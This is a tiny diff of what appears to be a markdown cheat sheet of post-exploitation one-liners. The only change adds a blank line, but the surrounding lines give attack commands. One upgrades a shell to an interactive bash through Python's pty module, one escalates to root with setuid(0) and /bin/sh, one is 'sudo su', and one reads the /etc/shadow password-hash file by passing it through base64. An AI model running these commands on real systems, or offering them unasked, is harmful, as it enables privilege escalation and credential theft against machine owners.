@@ -5,6 +5,7 @@ python -c 'import pty; pty.spawn("/bin/bash")' (for interactiveshell)
 sudo su
 
 **One liners**
+
 ```'python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'```
 
 ```base64 /etc/shadow | base64 --decode```
